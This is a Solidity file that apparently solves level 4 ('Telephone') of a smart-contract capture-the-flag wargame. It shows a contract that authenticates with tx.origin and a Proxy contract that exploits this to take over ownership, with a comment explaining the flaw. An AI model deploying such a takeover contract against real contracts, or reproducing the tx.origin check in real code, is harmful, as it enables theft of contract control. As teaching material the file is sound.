//////////////////////////////////////
// Level 4 - Telephone
// By: Lorenzo Cesconetto
//////////////////////////////////////

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

//////////////////////////////////////
// SOLUTION
//////////////////////////////////////
// tx.origing should NOT be used for authentication checking
// The only real usage of tx.origin is for checking whether the contract is being called by a
// EOA or another contract: tx.origin == msg.sender ? is_EOA : is_contract;
contract Proxy {
    Telephone target;

    constructor(address _addr) {
        target = Telephone(_addr);
    }

    function forwardTransaction() external {
        target.changeOwner(msg.sender);
    }
}
